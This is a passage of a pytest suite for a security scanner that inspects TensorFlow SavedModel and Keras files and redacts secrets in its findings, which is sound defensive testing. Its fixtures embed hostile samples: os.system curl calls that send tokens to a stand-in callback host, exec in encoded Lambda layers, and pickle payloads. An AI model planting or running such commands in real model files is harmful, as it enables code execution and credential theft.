    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    scanner._initialize_context(str(model_path))
    result = scanner._create_result()
    scanner._check_protobuf_buffer_overflow(saved_model, result)
    length_checks = [check for check in result.checks if check.name == "Protobuf Node Name Length Check"]

    assert len(length_checks) == 1
    assert "<redacted>" in length_checks[0].details["node_name_preview"]
    _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_metadata_redacts_signature_and_tensor_identifiers(tmp_path: Path) -> None:
    import importlib

    importlib.import_module("modelaudit.protos")
    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel

    raw_secret = "sk-proj-CAND061SAVEDMETADATASECRET0000000000"
    model_dir = tmp_path / "metadata_redaction"
    model_dir.mkdir()
    saved_model = SavedModel()
    meta_graph = saved_model.meta_graphs.add()
    meta_graph.meta_info_def.tags.append(f"tag_{raw_secret}")
    signature = meta_graph.signature_def[f"serve_{raw_secret}"]
    signature.method_name = f"method_{raw_secret}"
    signature.inputs[f"input_{raw_secret}"].name = f"tensor_{raw_secret}:0"
    signature.outputs[f"output_{raw_secret}"].name = f"result_{raw_secret}:0"
    (model_dir / "saved_model.pb").write_bytes(saved_model.SerializeToString())

    metadata = tf_savedmodel_module.TensorFlowSavedModelScanner(
        config={"allow_metadata_deserialization": True}
    ).extract_metadata(str(model_dir))
    serialized_metadata = repr(metadata)

    assert raw_secret not in serialized_metadata
    assert "<redacted>" in serialized_metadata


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_metadata_extraction_failure_redacts_exception(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import importlib

    importlib.import_module("modelaudit.protos")
    from tensorflow.core.protobuf import saved_model_pb2

    raw_secret = "OPAQUE_MODEL_CONTROLLED_METADATA_FAILURE"
    model_dir = tmp_path / "metadata_failure"
    model_dir.mkdir()
    (model_dir / "saved_model.pb").write_bytes(b"model-controlled-content")

    class FailingSavedModel:
        def ParseFromString(self, _content: bytes) -> None:
            raise ValueError(raw_secret)

    monkeypatch.setattr(saved_model_pb2, "SavedModel", FailingSavedModel)

    metadata = tf_savedmodel_module.TensorFlowSavedModelScanner(
        config={"allow_metadata_deserialization": True}
    ).extract_metadata(str(model_dir))

    assert metadata["extraction_error"] == "<redacted>"
    assert raw_secret not in repr(metadata)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_protobuf_string_details_preserve_public_context(tmp_path: Path) -> None:
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "name": "public_script_node",
                "string_attrs": {
                    "html_snippet": '<script src="https://cdn.example/public/payload.js"></script>',
                },
            }
        ],
        model_name="protobuf_detail_public",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    injection_checks = [check for check in result.checks if check.name == "Protobuf String Injection Check"]

    assert injection_checks
    details = injection_checks[0].details
    assert details["node_name"] == "public_script_node"
    assert details["attribute_name"] == "html_snippet"
    assert "https://cdn.example/public/payload.js" in repr(details["matches"])
    assert "<redacted>" not in repr(details)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_graph_budget_allows_benign_graph_at_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_META_GRAPHS", 1)
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_GRAPH_NODES", 2)
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_FUNCTIONS", 1)
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_FUNCTION_NODES", 2)
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_NODE_ATTRIBUTES", 1)
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_ATTRIBUTE_STRING_VALUES", 2)
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_COLLECTIONS", 1)
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_COLLECTION_VALUES", 2)
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            graph_nodes=[
                {
                    "op": "Const",
                    "name": "graph_node_0",
                    "string_list_attrs": {"labels": ["safe_0", "safe_1"]},
                },
                {"op": "Identity", "name": "graph_node_1"},
            ],
            function_nodes={
                "__inference_safe_budget_1": [
                    {"op": "Const", "name": "function_node_0"},
                    {"op": "Identity", "name": "function_node_1"},
                ]
            },
            collection_values={"runtime_scripts": [b"safe_0", b"safe_1"]},
            model_name="benign_graph_at_budget",
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))

    assert result.success is True
    assert result.issues == []
    assert result.metadata["meta_graph_count"] == 1
    assert result.metadata["graph_node_count"] == 2
    assert result.metadata["function_count"] == 1
    assert result.metadata["function_node_count"] == 2
    assert result.metadata["node_attribute_count"] == 1
    assert result.metadata["attribute_string_value_count"] == 2
    assert result.metadata["collection_count"] == 1
    assert result.metadata["collection_value_count"] == 2
    assert result.metadata["op_counts"]["Const"] == 2
    assert not any(check.name == "SavedModel Graph Traversal Budget" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_scanner_with_blacklist(tmp_path: Path) -> None:
    """Test TensorFlow SavedModel scanner with custom blacklist patterns."""
    model_dir = create_tf_savedmodel(tmp_path)

    # Create a file with content that matches our blacklist
    (model_dir / "custom_file.txt").write_bytes(
        b"This file contains suspicious_function",
    )

    # Create scanner with custom blacklist
    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner(
        config={"blacklist_patterns": ["suspicious_function"]},
    )
    result = scanner.scan(str(model_dir))

    assert result.success is False

    # Should detect our blacklisted pattern
    blacklist_issues = [issue for issue in result.issues if "suspicious_function" in issue.message.lower()]
    assert len(blacklist_issues) > 0


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_scanner_none_blacklist_config_stays_quiet(tmp_path: Path) -> None:
    """`blacklist_patterns=None` should disable blacklist scanning without DEBUG noise."""
    model_dir = Path(create_tf_savedmodel(tmp_path))
    (model_dir / "custom_file.txt").write_text("contains harmless text\n", encoding="utf-8")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner(config={"blacklist_patterns": None}).scan(str(model_dir))

    assert result.success is True
    assert not any(check.name == "File Read Check" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_blacklist_scan_is_bounded_and_fail_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    text_path = model_dir / "custom_file.txt"
    text_path.write_text("A" * 32 + "blocked-token", encoding="utf-8")
    monkeypatch.setattr(tf_savedmodel_module, "_MAX_SAVEDMODEL_TEXT_SCAN_BYTES", 16)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner(
        config={"blacklist_patterns": ["blocked-token"]},
    ).scan(str(model_dir))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "savedmodel_blacklist_scan_size_limit" in result.metadata["scan_outcome_reasons"]
    assert not any(check.name == "Blacklist Pattern Check" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_pyfunc_reference_uses_token_boundaries(tmp_path: Path) -> None:
    """Benign function references containing suspicious substrings should not be mislabeled."""
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "PyFunc",
                "name": "pyfunc_node",
                "string_attrs": {"function_name": "custom_package.systematic_math"},
            }
        ],
        model_name="benign_pyfunc_reference",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)

    assert result.success is False
    assert not any(
        issue.message and "references dangerous function: custom_package.systematic_math" in issue.message
        for issue in result.issues
    )
    assert any(
        issue.message and "PyFunc operation detected (unable to extract Python code)" in issue.message
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_pyfunc_reference_flags_direct_dangerous_refs(tmp_path: Path) -> None:
    """Direct dangerous function references should still be detected after token-boundary narrowing."""
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "PyFunc",
                "name": "pyfunc_node",
                "string_attrs": {"function_name": "os.system"},
            }
        ],
        model_name="malicious_pyfunc_reference",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)

    assert result.success is False
    assert any(
        issue.message
        and "references dangerous function: os.system" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("function_reference") == "os.system"
        for issue in result.issues
    )


def _assert_secret_absent_from_exported_result(result: Any, raw_secret: str) -> None:
    exported = result.to_json()
    assert raw_secret not in exported
    assert "<redacted>" in exported


def test_savedmodel_preview_redaction_preserves_benign_context() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        "os.system('curl https://callback.example/public/model.bin?download=1')",
        200,
    )

    assert "os.system" in preview
    assert "https://callback.example/public/model.bin?download=1" in preview
    assert "<redacted>" not in preview


def test_savedmodel_preview_redaction_removes_generic_url_userinfo() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        "wss://WEBSOCKETTOKEN@socket.example/stream ftp://user:FTPPASSWORD@files.example/model.bin",
        200,
    )

    assert "WEBSOCKETTOKEN" not in preview
    assert "user:FTPPASSWORD" not in preview
    assert preview.count("<credentials-redacted>@") == 2


def test_savedmodel_preview_redaction_removes_path_capability_tokens() -> None:
    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
    jwt_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.signature"
    preview = tf_savedmodel_module._safe_decoded_preview(
        f"os.system('curl https://callback.example/{github_token}/model') "
        f"https://callback.example/api/{jwt_token}/done",
        500,
    )

    assert github_token not in preview
    assert jwt_token not in preview
    assert "os.system" in preview
    assert "https://callback.example/<redacted>/model" in preview
    assert "https://callback.example/api/<redacted>/done" in preview


def test_savedmodel_preview_redaction_removes_nested_url_credentials() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        "https://callback.example/hook?ok=1;to%6ben=SEMICOLONSECRET123 "
        "https://callback.example/hook?ok=token%253DNESTEDSECRET456 "
        "https://callback.example/hook?ok=1&amp;token=HTMLSECRET789",
        500,
    )

    assert "SEMICOLONSECRET123" not in preview
    assert "NESTEDSECRET456" not in preview
    assert "HTMLSECRET789" not in preview
    assert preview.count("<redacted>") == 3


def test_savedmodel_preview_redaction_removes_bracketed_query_credentials() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        "https://callback.example/hook?api_key[]=ARRAYSECRET123&token[0]=INDEXSECRET456&ok=1",
        500,
    )

    assert "ARRAYSECRET123" not in preview
    assert "INDEXSECRET456" not in preview
    assert "api_key%5B%5D=<redacted>" in preview
    assert "token%5B0%5D=<redacted>" in preview
    assert "ok=1" in preview


def test_savedmodel_preview_redaction_removes_python_container_secrets() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        'private_key = """MULTILINESECRET123\nSTILLSECRET456"""\n'
        'os.environ["API_KEY"] = "ENVSECRET789"\n'
        'headers["Authorization"] = "HEADERSECRET000"\n'
        'config = {"client_secret": "MAPSECRET111", "callback": "https://callback.example/public"}\n'
        'os.system("id")',
        500,
    )

    assert "MULTILINESECRET123" not in preview
    assert "STILLSECRET456" not in preview
    assert "ENVSECRET789" not in preview
    assert "HEADERSECRET000" not in preview
    assert "MAPSECRET111" not in preview
    assert "os.system" in preview
    assert "https://callback.example/public" in preview
    assert preview.count("<redacted>") == 4


def test_savedmodel_preview_redaction_removes_escaped_quote_secret() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview('api_key = "prefix\\"ESCAPEDSECRET123"\nos.system("id")', 200)

    assert "ESCAPEDSECRET123" not in preview
    assert 'api_key = "<redacted>"' in preview
    assert "os.system" in preview


def test_savedmodel_preview_redaction_removes_prefixed_and_camel_case_secrets() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        'api_key = r"RAWSECRET123"\n'
        'dbPassword = f"DBSECRET456"\n'
        'headers["githubToken"] = b"GITHUBSECRET789"\n'
        'config = {"clientSecret": u"MAPSECRET000"}\n'
        'os.system("id")',
        500,
    )

    assert "RAWSECRET123" not in preview
    assert "DBSECRET456" not in preview
    assert "GITHUBSECRET789" not in preview
    assert "MAPSECRET000" not in preview
    assert 'api_key = r"<redacted>"' in preview
    assert 'dbPassword = f"<redacted>"' in preview
    assert 'headers["githubToken"] = b"<redacted>"' in preview
    assert '"clientSecret": u"<redacted>"' in preview
    assert "os.system" in preview


def test_savedmodel_preview_redaction_removes_authorization_and_escaped_json_secrets() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        'Authorization = "ApiKey AUTHSECRET123"\n'
        "Authorization: ApiKey AUTHSECRET789\n"
        r'payload="{\"api_key\":\"ESCAPEDJSONSECRET456\", \"safe\":\"ok\"}"'
        '\nos.system("id")',
        500,
    )

    assert "AUTHSECRET123" not in preview
    assert "AUTHSECRET789" not in preview
    assert "ESCAPEDJSONSECRET456" not in preview
    assert 'Authorization = "<redacted>"' in preview
    assert "Authorization: <redacted>" in preview
    assert r"\"api_key\":\"<redacted>\"" in preview
    assert r"\"safe\":\"ok\"" in preview
    assert "os.system" in preview


def test_savedmodel_preview_redaction_removes_non_scalar_sensitive_values() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        '{"api_key": ["ARRAYSECRET123"], "clientSecret": {"nested": "OBJECTSECRET456"}, "safe": true}\n'
        "api_key: |\n"
        "  BLOCKSECRET789\n"
        "os.system('id')",
        500,
    )

    assert "ARRAYSECRET123" not in preview
    assert "OBJECTSECRET456" not in preview
    assert "BLOCKSECRET789" not in preview
    assert '"api_key": <redacted>' in preview
    assert '"clientSecret": <redacted>' in preview
    assert "api_key: |\n  <redacted>" in preview
    assert "os.system" in preview


def test_savedmodel_preview_redaction_removes_parenthesized_secret_values() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        'api_key = ("PARENSECRET123")\n'
        'headers["Authorization"] = (\n  "HEADERSECRET456"\n)\n'
        'config = {"clientSecret": ("MAPSECRET789")}\n'
        'os.system("id")',
        500,
    )

    assert "PARENSECRET123" not in preview
    assert "HEADERSECRET456" not in preview
    assert "MAPSECRET789" not in preview
    assert 'api_key = ("<redacted>")' in preview
    assert 'headers["Authorization"] = (\n  "<redacted>"\n)' in preview
    assert '"clientSecret": ("<redacted>")' in preview
    assert "os.system" in preview


def test_savedmodel_preview_redaction_does_not_expand_original_window() -> None:
    private_tail = "PRIVATE_AFTER_LONG_SECRET_SHOULD_NOT_APPEAR"
    preview = tf_savedmodel_module._safe_decoded_preview(f'api_key = "{"A" * 10_000}"\n{private_tail}', 80)

    assert "AAAA" not in preview
    assert private_tail not in preview
    assert 'api_key = "<redacted>' in preview
    assert preview.endswith("...")


def test_savedmodel_preview_redaction_redacts_boundary_crossing_tokens() -> None:
    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
    private_tail = "PRIVATE_AFTER_TOKEN_SHOULD_NOT_APPEAR"
    preview = tf_savedmodel_module._safe_decoded_preview(f"padding{'x' * 62}/{github_token}/{private_tail}", 80)

    assert "ghp_" not in preview
    assert github_token not in preview
    assert private_tail not in preview
    assert "/<redacted>" in preview
    assert preview.endswith("...")


def test_savedmodel_preview_redaction_redacts_boundary_crossing_url_userinfo() -> None:
    url_prefix = "https://user:very-secret-password"
    private_tail = "PRIVATE_AFTER_USERINFO_SHOULD_NOT_APPEAR"
    preview = tf_savedmodel_module._safe_decoded_preview(
        f"{'x' * (80 - len(url_prefix))}{url_prefix}@example.com/{private_tail}", 80
    )

    assert "user:very-secret-password" not in preview
    assert "very-secret-password" not in preview
    assert private_tail not in preview
    assert "https://<credentials-redacted>" in preview
    assert preview.endswith("...")


def test_savedmodel_preview_redaction_removes_nested_encoded_query_secrets() -> None:
    preview = tf_savedmodel_module._safe_decoded_preview(
        "first=https://example.com/hook?redirect=https%3A%2F%2Fcb%2F%3Fapi_key%5B%5D%3DNESTEDARRAYSECRET123 "
        "second=https://example.com/hook?payload=%7B%22api_key%22%3A%22JSONSECRET456%22%7D",
        500,
    )

    assert "NESTEDARRAYSECRET123" not in preview
    assert "JSONSECRET456" not in preview
    assert "redirect=<redacted>" in preview
    assert "payload=<redacted>" in preview


def test_savedmodel_preview_redaction_removes_nested_redirect_url_secrets() -> None:
    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
    preview = tf_savedmodel_module._safe_decoded_preview(
        "first=https://example.com/hook?redirect=https%3A%2F%2Fuser%3Apass%40evil.example%2Fcb "
        f"second=https://example.com/hook?callback=https%3A%2F%2Fcb.example%2F{github_token}%2Fdone",
        500,
    )

    assert "user%3Apass" not in preview
    assert "user:pass" not in preview
    assert github_token not in preview
    assert "redirect=<redacted>" in preview
    assert "callback=<redacted>" in preview


def test_savedmodel_preview_redaction_removes_additional_url_secret_shapes() -> None:
    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
    preview = tf_savedmodel_module._safe_decoded_preview(
        f"file:///tmp/{github_token}/model "
        "ssh://SSHTOKEN@git.example/repo "
        "ftps://user:FTPSPASSWORD@files.example/model.bin "
        "https://example.com/hook?token=SEMICOLONSECRET123;STILLSECRET456&ok=1",
        500,
    )

    assert github_token not in preview
    assert "SSHTOKEN" not in preview
    assert "user:FTPSPASSWORD" not in preview
    assert "SEMICOLONSECRET123" not in preview
    assert "STILLSECRET456" not in preview
    assert "file:///tmp/<redacted>/model" in preview
    assert "ssh://<credentials-redacted>@git.example/repo" in preview
    assert "ftps://<credentials-redacted>@files.example/model.bin" in preview
    assert "token=<redacted>" in preview
    assert "ok=1" in preview


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_collection_preview_redacts_sensitive_values(tmp_path: Path) -> None:
    raw_secret = "c081-collection-secret-value-00000000"
    collection_payload = (
        f'os.system("curl https://callback.example/hook?token={raw_secret}")\napi_key="{raw_secret}"\n'
    ).encode()
    model_path = _create_test_savedmodel_with_collection(
        tmp_path,
        key="runtime_hook",
        value=collection_payload,
        model_name="collection_preview_secret",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    collection_checks = [check for check in result.checks if check.name == "SavedModel Collection Executable Pattern"]

    assert result.has_warnings is True
    assert collection_checks
    preview = collection_checks[0].details["value_preview"]
    assert "os.system" in preview
    assert raw_secret not in preview
    assert "<redacted>" in preview
    _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_collection_key_details_redact_sensitive_values(tmp_path: Path) -> None:
    raw_secret = "sk-proj-CAND061SAVEDCOLLECTIONSECRET000000"
    model_path = _create_test_savedmodel_with_collection(
        tmp_path,
        key=f"runtime_hook_{raw_secret}",
        value=b'os.system("curl https://callback.example/public")',
        model_name="collection_key_secret",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    collection_checks = [check for check in result.checks if check.name == "SavedModel Collection Executable Pattern"]

    assert collection_checks
    assert "runtime_hook" in collection_checks[0].details["collection_key"]
    assert "<redacted>" in collection_checks[0].details["collection_key"]
    assert "https://callback.example/public" in collection_checks[0].details["value_preview"]
    _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_pyfunc_code_preview_redacts_sensitive_values(tmp_path: Path) -> None:
    raw_secret = "c081-pyfunc-secret-value-00000000"
    python_code = (
        f'import os\napi_key = "{raw_secret}"\nos.system("curl https://callback.example/hook?token={raw_secret}")\n'
    )
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "PyFunc",
                "name": "pyfunc_with_secret_code",
                "string_attrs": {"func": python_code},
            }
        ],
        model_name="pyfunc_preview_secret",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    pyfunc_checks = [check for check in result.checks if check.name == "PyFunc Python Code Analysis"]

    assert result.success is False
    assert pyfunc_checks
    preview = pyfunc_checks[0].details["code_preview"]
    assert "os.system" in preview
    assert raw_secret not in preview
    assert "<redacted>" in preview
    _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_pyfunc_code_preview_redacts_container_secret_values(tmp_path: Path) -> None:
    raw_secrets = [
        "c081-multiline-secret-000000",
        "c081-env-secret-111111",
        "c081-auth-secret-222222",
        "c081-map-secret-333333",
    ]
    python_code = (
        "import os\n"
        'os.system("curl https://callback.example/public")\n'
        f'private_key = """{raw_secrets[0]}\n{raw_secrets[0]}"""\n'
        f'os.environ["API_KEY"] = "{raw_secrets[1]}"\n'
        f'headers = {{"Authorization": "{raw_secrets[2]}", "client_secret": "{raw_secrets[3]}"}}\n'
    )
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "PyFunc",
                "name": "pyfunc_with_structured_secret_code",
                "string_attrs": {"func": python_code},
            }
        ],
        model_name="pyfunc_structured_preview_secret",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    pyfunc_checks = [check for check in result.checks if check.name == "PyFunc Python Code Analysis"]

    assert result.success is False
    assert pyfunc_checks
    preview = pyfunc_checks[0].details["code_preview"]
    assert "os.system" in preview
    for raw_secret in raw_secrets:
        assert raw_secret not in preview
        _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_pyfunc_invalid_data_preview_redacts_sensitive_values(tmp_path: Path) -> None:
    raw_secret = "c081-pyfunc-invalid-secret-000000"
    python_data = f'api_key = "{raw_secret}"\nif True print("broken")\n'
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "PyFunc",
                "name": "pyfunc_with_secret_data",
                "string_attrs": {"func": python_data},
            }
        ],
        model_name="pyfunc_data_preview_secret",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    pyfunc_checks = [check for check in result.checks if check.name == "PyFunc Code Validation"]

    assert result.success is False
    assert pyfunc_checks
    preview = pyfunc_checks[0].details["data_preview"]
    assert "api_key" in preview
    assert raw_secret not in preview
    assert "<redacted>" in preview
    _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_keras_metadata_code_preview_redacts_sensitive_values(tmp_path: Path) -> None:
    raw_secret = "c081-keras-metadata-secret-000000"
    decoded_code = (
        "import os\n"
        f'client_secret = "{raw_secret}"\n'
        f'os.system("curl https://callback.example/hook?token={raw_secret}")\n'
    )
    encoded_code = base64.b64encode(decoded_code.encode()).decode()
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
    lambda_checks = [check for check in result.checks if check.name == "Lambda Layer Security Check"]

    assert result.success is False
    assert lambda_checks
    preview = lambda_checks[0].details["code_preview"]
    assert "os.system" in preview
    assert raw_secret not in preview
    assert "<redacted>" in preview
    _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_keras_metadata_decode_error_redacts_exception(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    raw_secret = "ATTACKER_CONTROLLED_KERAS_DECODE_FAILURE"
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(b'"class_name": "Lambda", "function": {"items": ["AAAA"]}')

    def fail_decode(_value: str) -> bytes:
        raise ValueError(raw_secret)

    monkeypatch.setattr(tf_savedmodel_module.base64, "b64decode", fail_decode)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
    decode_checks = [
        check for check in result.checks if check.name == "Lambda Layer Detection" and "decode_error" in check.details
    ]

    assert decode_checks
    assert decode_checks[0].details["decode_error"] == "<redacted>"
    assert raw_secret not in result.to_json()


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_scan_keras_metadata_pb_lambda_exec_sets_success_false(tmp_path: Path) -> None:
    """Standalone `keras_metadata.pb` scans should propagate CRITICAL Lambda findings to success=False."""
    encoded_code = base64.b64encode(b'exec("print(1)")').decode()
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(
        _keras_metadata_with_json_metadata(
            f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode()
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))

    assert result.success is False
    assert any(
        issue.message
        and "Lambda layer contains dangerous code" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_benign_text_file_passes(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    (model_dir / "assets" / "vocab.txt").write_text("token_a\ntoken_b\n", encoding="utf-8")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    asset_checks = [check for check in result.checks if check.name == "SavedModel Assets Security Check"]

    assert asset_checks == []


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_root_sibling_pickle_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    sibling_path = model_dir / "payload.dat"
    sibling_path.write_bytes(_build_protocol1_pickle_payload())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    matching_checks = [
        check
        for check in result.checks
        if check.name == "SavedModel Supplemental File Security Check" and check.location == str(sibling_path)
    ]

    assert matching_checks
    assert all(check.severity == IssueSeverity.WARNING for check in matching_checks)
    assert any("pickle_payload" in check.details.get("detected_content_type", "") for check in matching_checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_reserved_root_dir_name_file_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    sibling_path = model_dir / "assets.extra"
    sibling_path.write_bytes(_build_protocol1_pickle_payload())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    matching_checks = [
        check
        for check in result.checks
        if check.name == "SavedModel Supplemental File Security Check" and check.location == str(sibling_path)
    ]

    assert matching_checks
    assert any("pickle_payload" in check.details.get("detected_content_type", "") for check in matching_checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_root_sibling_benign_text_stays_clean(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    sibling_path = model_dir / "README.txt"
    sibling_path.write_text("model notes only\n", encoding="utf-8")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    assert not [
        check
        for check in result.checks
        if check.name == "SavedModel Supplemental File Security Check" and check.location == str(sibling_path)
    ]


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_root_sibling_directory_pickle_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    sibling_path = model_dir / "supplemental" / "payload.dat"
    sibling_path.parent.mkdir()
    sibling_path.write_bytes(_build_protocol1_pickle_payload())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    matching_checks = [
        check
        for check in result.checks
        if check.name == "SavedModel Supplemental File Security Check" and check.location == str(sibling_path)
    ]

    assert matching_checks
    assert any("pickle_payload" in check.details.get("detected_content_type", "") for check in matching_checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_supplemental_filename_details_redact_sensitive_values(tmp_path: Path) -> None:
    raw_secret = "sk-proj-CAND061TFFILENAMESECRET000000000000"
    model_dir = Path(create_tf_savedmodel(tmp_path))
    sibling_path = model_dir / "supplemental" / f"payload_{raw_secret}.bin"
    sibling_path.parent.mkdir()
    sibling_path.write_text("#!/bin/sh\necho review\n", encoding="utf-8")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    matching_checks = [check for check in result.checks if check.name == "SavedModel Supplemental File Security Check"]

    assert matching_checks
    assert any(check.location and "payload_<redacted>.bin" in check.location for check in matching_checks)
    assert any(check.details.get("file_name") == "payload_<redacted>.bin" for check in matching_checks)
    _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
